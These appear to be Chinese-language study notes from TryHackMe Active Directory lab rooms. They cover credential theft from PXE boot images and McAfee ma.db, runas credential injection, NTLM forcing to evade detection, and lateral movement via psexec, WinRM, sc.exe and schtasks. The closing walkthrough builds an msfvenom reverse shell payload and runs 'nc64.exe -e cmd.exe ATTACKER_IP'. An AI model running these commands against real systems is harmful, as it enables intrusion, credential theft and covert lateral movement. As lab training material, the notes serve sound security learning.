我们需要执行的第一步是使用 TFTP 并下载 BCD 文件以读取 MDT 服务器的配置。TFTP 比 FTP 更棘手，因为我们无法列出文件。相反，我们发送一个文件请求，服务器将通过 UDP 连接回我们以传输文件。因此，在指定文件和文件路径时，我们需要准确无误。BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。我们可以在 SSH 会话中使用以下命令启动 TFTP 传输：
```powershell
C:\Users\THM\Documents\Am0> tftp -i <MDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd

Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```
您必须使用 `nslookup mdt.{domain}` 查找MDT IP。随着BCD文件的恢复，我们将使用powerpxe来读取其内容。Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但结果通常会有所不同，因此最好执行手动方法。我们将使用 powerpxe 的 Get-WimFile 函数从 BCD 文件中恢复 PXE 启动映像的位置：
```powershell
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. 
PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1 
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd" 
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile >> Parse the BCD file: conf.bcd >>>> Identify wim file : <PXE Boot Image Location> <PXE Boot Image Location>
```
WIM 文件是 Windows 映像格式 （WIM） 中的可启动映像。现在，我们已经有了 PXE 启动映像的位置，我们可以再次使用 TFTP 下载此映像：
```powershell
PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim 
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```
### 从 PXE 启动映像恢复凭据
现在，我们已经恢复了 PXE 启动映像，我们可以泄露存储的凭据。应该注意的是，我们可以进行各种攻击。我们可以注入本地管理员用户，这样我们就可以在映像启动后立即获得管理员访问权限，我们可以安装映像以拥有已加入域的计算机。如果您有兴趣了解有关这些攻击的更多信息，可以阅读[[借助 LAPS 和 PXE 接管 Windows 工作站 - RiskInsight.pdf]]。本练习将重点介绍仅尝试泄露凭据的简单攻击。
同样，我们将使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找通常存储这些类型的凭据的 bootstrap.ini 文件来手动执行此步骤。要使用 powerpxe 从引导程序文件中恢复凭据，请运行以下命令：
```powershell
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim 
>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```
如您所见，powerpxe 能够恢复 AD 凭据。现在，我们有了另一组可以使用的 AD 凭据！
## 配置文件
我们将在此网络中探索的最后一个枚举途径是配置文件。假设您很幸运地造成了一个漏洞，使您可以访问组织网络上的主机。在这种情况下，配置文件是尝试恢复 AD 凭据的绝佳途径。根据被破坏的主机，各种配置文件可能对枚举有价值：
- 应用程序配置文件  
- 服务配置文件
- 注册表项
- 集中部署的应用程序
可以使用多个枚举脚本（例如 [Seatbelt](https://github.com/GhostPack/Seatbelt) ）来自动执行此过程。
### 配置文件凭据
但是，在此，我们将重点介绍如何从集中部署的应用程序恢复凭据。通常，这些应用程序需要一种方法在安装和执行阶段对域进行身份验证。例如，McAfee Enterprise Endpoint Security 是此类应用程序的一个示例，组织可以将其用作安全端点检测和响应工具。
McAfee 将安装期间用于连接回业务流程协调程序的凭据嵌入到名为 ma.db 的文件中。可以通过对主机的本地访问权限检索和读取此数据库文件，以恢复关联的 AD 服务帐户。
ma.db 文件存储在固定位置：
```
C:\ProgramData\McAfee\Agent\DB
```
要读取数据库文件，我们将使用一个名为 sqlitebrowser 的工具。我们可以使用以下命令打开数据库：
```shell
sqlitebrowser ma.db
```
使用 sqlitebrowser，我们将选择“浏览数据”选项并关注AGENT_REPOSITORIES表：
![Pasted image 20240319223609.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240319223609.png)
我们对第二个条目特别感兴趣，重点是 DOMAIN、AUTH_USER 和 AUTH_PASSWD 字段条目。记下这些条目中存储的值。但是，AUTH_PASSWD字段是加密的。幸运的是，迈克菲使用已知密钥加密此字段。[迈克菲解密工具](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)
# AD Enumeration
![Screenshot_2024-03-25-08-56-02-949-edit_com.microsoft.emmx.jpg](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Screenshot_2024-03-25-08-56-02-949-edit_com.microsoft.emmx_.jpg)
枚举与利用是紧密联系的，通常我们可以通过横向移动或权限提升获得额外的访问权限，直到我们有足够的权限实现我们的目标，一旦枚举到有效的攻击路径，利用它获取新的立足点，就需要再次枚举，循环往复。
## 凭证注入
runas是windows自带的工具，runas名为run as，可以使用特定凭证以其身份来运行程序。
### Runas
如果发现了有效的AD凭证，那么就可以通过如下命令以其身份启动一个cmd：
`runas.exe /netonly /user:<domain>\<username> cmd.exe`
参数解释：
/netonly - 由于我们未加入域，因此我们希望加载用于网络身份验证的凭据，但不对域控制器进行身份验证。因此，在计算机上本地执行的命令将在标准 Windows 帐户的上下文中运行，但任何网络连接都将使用此处指定的帐户进行。（由于这个参数，域控制器不会直接验证凭据，所以输入任何密码都可以被接受。在某些情况下，需要正确的输入密码，否则就算注入了凭证，也没有相对应的权限。）
/user - 在这里，我们提供域和用户名的详细信息。使用完全限定域名 （FQDN） 而不仅仅是域的 NetBIOS 名称始终是一个安全的选择，因为这将有助于解决。
cmd.exe - 这是我们在注入凭据后要执行的程序。这可以更改为任何内容，但最安全的赌注是cmd.exe，因为可以使用它来启动任何想要的内容，并注入凭据。
### DNS
在使用注入凭据启动cmd后，要验证凭据是否正常工作，最可靠的方法是访问SYSVOL。任何AD账户，无论其权限多么低，都可以访问SYSVOL的内容。
SYSVOL 是存在于所有域控制器上的文件夹。它是一个共享文件夹，用于存储组策略对象 （GPO） 和信息以及任何其他与域相关的脚本。它是 Active Directory 的基本组件，因为它将这些 GPO 传送到域上的所有计算机。然后，已加入域的计算机可以读取这些 GPO 并应用适用的 GPO，从而从中心位置进行域范围的配置更改。
在列出 SYSVOL 之前，我们需要配置 DNS。有时你很幸运，内部DNS会通过DHCP或VPN连接自动为你配置，但并非总是如此(如这个THM网络)。了解如何手动执行此操作是件好事。对于DNS服务器来说，最安全的选择通常是域控制器。使用域控制器的 IP，我们可以在 PowerShell 窗口中执行以下命令：
```powershell
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```
```powershell
C:\> nslookup za.tryhackme.com
```
现在应解析为 DC IP，因为这是托管 FQDN 的位置。现在DNS正在工作，我们终于可以测试我们的凭据了。我们可以使用以下命令强制列出 SYSVOL 目录的基于网络的列表：
```powershell
C:\Tools>dir \\za.tryhackme.com\SYSVOL\
 Volume in drive \\za.tryhackme.com\SYSVOL is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\za.tryhackme.com\SYSVOL

02/24/2022  09:57 PM    <DIR>          .
02/24/2022  09:57 PM    <DIR>          ..
02/24/2022  09:57 PM    <JUNCTION>     za.tryhackme.com [C:\Windows\SYSVOL\domain]
               0 File(s)              0 bytes
               3 Dir(s)  51,835,408,384 bytes free
```
在此并不深入讨论SYSVOL，但这个位置也有可能存着某些凭据。
### IP与主机名
Q：两者有区别吗？
`dir \\za.tryhackme.com\SYSVOL和dir \\<DC IP>\SYSVOL`
为什么对DNS大惊小怪？
A：有很大的不同，它归结为所使用的身份验证方法。当我们提供主机名时，网络身份验证将首先尝试执行 Kerberos 身份验证。由于 Kerberos 身份验证使用票证中嵌入的主机名，因此如果我们提供 IP，则可以强制身份验证类型为 NTLM。虽然从表面上看，这对我们来说并不重要，但了解这些细微的差异是件好事，因为它们可以让您在红队评估期间保持更加隐蔽。在某些情况下，组织将监控 OverPass 和 Pass-The-Hash 攻击。强制 NTLM 身份验证是本书中的一个很好的技巧，可以避免在这些情况下被检测到。

# Lateral Movement and Pivoting
## 什么是横向移动？
> 简而言之，横向移动是攻击者用来在网络上移动的一组技术。一旦攻击者获得了对网络第一台机器的访问权限，出于多种原因，移动是必不可少的，包括： - 实现我们作为攻击者的目标 - 绕过现有的网络限制 - 建立额外的网络入口点 - 制造混乱并避免被发现。
>虽然许多网络杀伤链将横向移动作为线性过程中的附加步骤，但它实际上是循环的一部分。在此周期中，我们使用任何可用的凭据来执行横向移动，从而使我们能够访问新计算机，并在可能的情况下提升权限并提取凭据。使用新发现的凭据，循环将再次开始。
>![Pasted image 20240409141914.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240409141914.png)
>通常，在达到网络上的最终目标之前，我们会多次重复这个循环。如果我们的第一个立足点是一台对其他网络资源几乎没有访问权限的计算机，我们可能需要横向移动到在网络上具有更多权限的其他主机。
### 快速示例

假设我们正在执行红队参与，我们的最终目标是访问内部代码存储库，在那里我们通过使用网络钓鱼活动在目标网络上获得了第一个入侵。通常，网络钓鱼活动对非技术用户更有效，因此我们的第一次访问可能是通过营销部门的机器。

营销工作站通常会受到防火墙策略的限制，无法访问网络上的任何关键服务，包括管理协议、数据库端口、监控服务或日常工作不需要的任何其他服务，包括代码存储库。

为了覆盖敏感的主机和服务，我们需要转移到其他主机，然后从那里转向我们的最终目标。为此，我们可以尝试提升 Marketing 工作站的权限并提取本地用户的密码哈希值。如果我们找到本地管理员，则其他主机上可能存在相同的帐户。经过一些侦察，我们找到了一个名为 DEV-001-PC 的工作站。我们使用本地管理员的密码哈希来访问 DEV-001-PC，并确认它归公司的一位开发人员所有。从那里，可以访问我们的目标代码存储库.

![Pasted image 20240409142204.png](https://111.229.238.168/wordpress/wp-content/uploads/2024/12/Pasted-image-20240409142204.png)

请注意，虽然可能需要使用横向移动来规避防火墙限制，但它也有助于逃避检测。在我们的示例中，即使 Marketing 工作站可以直接访问代码存储库，也可能需要通过开发人员的 PC 进行连接。从蓝队分析师检查登录审核日志的角度来看，这种行为不会那么可疑。

  
### 攻击者的视角

攻击者可以通过多种方式横向移动。最简单的方法是使用标准管理协议（如 WinRM、RDP、VNC 或 SSH）连接到网络上的其他计算机。这种方法可以用来在某种程度上模拟普通用户的行为，只要在规划在哪里与哪个帐户连接时保持一定的连贯性。虽然 IT 用户通过 RDP 连接到 Web 服务器可能是很常见的，但必须注意不要尝试可疑连接（例如，为什么本地管理员用户从 Marketing-PC 连接到 DEV-001-PC？

如今，攻击者也有其他横向移动的方法，同时使蓝队有效检测正在发生的事情更具挑战性。虽然没有任何技术可以被认为是万无一失的，但我们至少可以尝试尽可能地保持沉默。在以下任务中，我们将介绍一些最常见的横向移动技术。

### 管理员和 UAC

While performing most of the lateral movement techniques introduced throughout the room, we will mainly use administrator credentials. While one might expect that every single administrator account would serve the same purpose, a distinction has to be made between two types of administrators:  
在执行整个房间中引入的大多数横向移动技术时，我们将主要使用管理员凭据。虽然人们可能期望每个管理员帐户都具有相同的目的，但必须区分两种类型的管理员：

- Local accounts part of the local Administrators group  
    本地管理员组的本地帐户
- Domain accounts part of the local Administrators group  
    本地 Administrators 组的域帐户

我们感兴趣的差异是用户帐户控制 （UAC） 对本地管理员（默认管理员帐户除外）施加的限制。默认情况下，本地管理员将无法远程连接到计算机并执行管理任务，除非通过 RDP 使用交互式会话。Windows 将拒绝通过 RPC、SMB 或 WinRM 请求的任何管理任务，因为此类管理员将使用筛选的中型完整性令牌登录，从而阻止帐户执行特权操作。唯一将获得完全权限的本地帐户是默认管理员帐户。

具有本地管理权限的域帐户将不受相同的待遇，并将使用完全管理权限登录。

如果需要，可以禁用此安全功能，有时您会发现管理员组中的本地帐户和域帐户之间没有区别。不过，必须记住，如果某些横向移动技术失败，可能是由于使用了强制实施 UAC 的非默认本地管理员。您可以在[这里](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) 阅读有关此安全功能的更多详细信息。

## 远程生成进程

此任务将查看攻击者必须远程生成进程的可用方法，从而允许他们在具有有效凭据的计算机上运行命令。所讨论的每种技术都使用略有不同的方法来实现相同的目的，其中一些可能更适合某些特定方案。

### Psexec 

- **Ports:** 445/TCP (SMB) 
- **Required Group Memberships:** Administrators  
    必需的组成员身份：管理员

多年来，Psexec 一直是需要远程执行流程的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。Psexec 是众多 Sysinternals 工具之一，可在[此处](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)下载。

psexec 的工作方式如下：

1. 连接到 Admin$ 共享并上传服务二进制文件。Psexec 使用 psexesvc.exe 作为名称。
2. 连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 `C:\Windows\psexesvc.exe` 相关联。
3. 创建一些命名管道来处理 stdin/stdout/stderr。

![psexec explained](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png)  

要运行 psexec，我们只需要提供远程主机所需的管理员凭据和我们要运行的命令（为方便起见，THMJMP2 中的 `C:\tools` 下提供了 `psexec64.exe` ）：

```shell-session
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### 使用 WinRM 创建远程进程

- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
- **Required Group Memberships:** Remote Management Users  
    所需的组成员身份：远程管理用户

Windows 远程管理 （WinRM） 是一种基于 Web 的协议，用于将 Powershell 命令远程发送到 Windows 主机。默认情况下，大多数 Windows Server 安装都将启用 WinRM，使其成为一种有吸引力的攻击媒介。

若要从命令行连接到远程 Powershell 会话，可以使用以下命令：

```shell-session
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

获得 PSCredential 对象后，可以使用 Enter-PSSession cmdlet 创建交互式会话：

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭据也必须通过 PSCredential 对象传递：

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

  

### 使用 sc 远程创建服务

- **Ports: **
    - 135/TCP, 49152-65535/TCP (DCE/RPC) 
    - 445/TCP (RPC over SMB Named Pipes)  
    - 139/TCP (RPC over SMB Named Pipes) 
- **Required Group Memberships:** Administrators  
    必需的组成员身份：管理员

Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们将 Windows 服务配置为运行任何应用程序，它仍将执行它并在之后失败。

我们可以使用 sc.exe 在远程主机上创建服务，这是 Windows 中提供的标准工具。使用 sc 时，它将尝试通过 RPC 以多种方式连接到服务控制管理器 （SVCCTL） 远程服务程序：

1.将使用 DCE/RPC 进行连接尝试。客户端将首先连接到端口 135 上的端点映射器 （EPM），该端点用作可用 RPC 端点的目录，并请求有关 SVCCTL 服务程序的信息。然后，EPM 将使用 IP 和端口进行响应以连接到 SVCCTL，SVCCTL 通常是 49152-65535 范围内的动态端口。

![svcctl via RPC](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png) 2. 如果后一个连接失败，sc 将尝试通过端口 445 （SMB） 或 139 （SMB over NetBIOS） 上的 SMB 命名管道访问 SVCCTL。

![svcctl via named pipe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png)  


我们可以使用以下命令创建并启动名为“THMservice”的服务：

```shell-session
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

“net user”命令将在服务启动时执行，从而在系统上创建新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。

要停止和删除服务，我们可以执行以下命令：

```shell-session
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

  

### 远程创建计划任务

我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建和运行一个，在任何 Windows 安装中都可用。要创建名为 THMtask1 的任务，我们可以使用以下命令：

```shell-session
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

我们将计划类型 （/sc） 设置为 ONCE，这意味着任务只在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 （/sd） 和开始时间 （/st） 无论如何都无关紧要。


由于系统将运行计划任务，因此该命令的输出将不可用，因此这是一种盲目攻击。

最后，要删除计划任务，我们可以使用以下命令并自行清理：

```shell-session
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### Let's Get to Work!  

在本练习中，我们假设我们已经捕获了一些具有管理访问权限的凭据：

**User:** ZA.TRYHACKME.COM\t1_leonard.summers  
用户：ZA.TRYHACKME.COM\t1_leonard.summers

**Password:** EZpass4ever 

我们将展示如何使用这些凭据通过 `sc.exe` 横向移动到 THMIIS。随意尝试其他方法，因为它们都应该对 THMIIS 起作用。

虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用 `net user` ），但我们也可以上传我们想要执行的任何二进制文件并将其与创建的服务相关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。这样做的原因是服务可执行文件与标准.exe文件不同，因此非服务可执行文件最终几乎会立即被服务管理器杀死。幸运的是，msfvenom 支持 `exe-service` 格式，它将把我们喜欢的任何有效负载封装在一个功能齐全的服务可执行文件中，防止它被杀死。
 
要创建反向 shell，我们可以使用以下命令：

```shell-session
user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```

然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将我们的有效负载上传到 THMIIS 的 ADMIN$ 共享：
```shell-session
user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
```

上传可执行文件后，我们将在攻击者的机器上设置一个侦听器，以接收来自 `msfconsole` 的反向 shell：
```shell-session
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
```

或者，您可以在 Linux 控制台上运行以下单行代码来执行相同的操作：
```shell-session
user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```
由于 `sc.exe` 不允许我们在命令中指定凭据，因此我们需要使用 `runas` 生成一个带有 t1_leonard.summer 访问令牌的新 shell。尽管如此，我们只能对计算机进行 SSH 访问，因此，如果我们尝试类似 `runas /netonly /user:ZA\t1_leonard.summers cmd.exe` ，新的命令提示符将在用户会话中生成，但我们将无法访问它。为了克服这个问题，我们可以使用 runas 生成第二个带有 t1_leonard.summers 访问令牌的反向 shell： 
```THMJMP2CommandPrompt 
C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```

注意：请记住，由于您使用的是带有 `/netonly` 选项的 `runas` ，因此检查提供的凭据是否有效不会费心（更多信息请参阅枚举 AD 房间），因此请务必正确键入密码。否则，稍后将在聊天室中看到一些 ACCESS DENIED 错误。

我们可以像往常一样使用 nc 接收反向 shell 连接：

```shell-session
user@AttackBox$ nc -lvp 4443
```
最后，继续使用 sc 远程创建一个新服务，将其与我们上传的二进制文件相关联：
```THMJMP2CommandPrompt
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```
启动服务后，您应该会收到一个连接，从那里您可以访问 t1_leonard.summers 桌面上的第一个标志。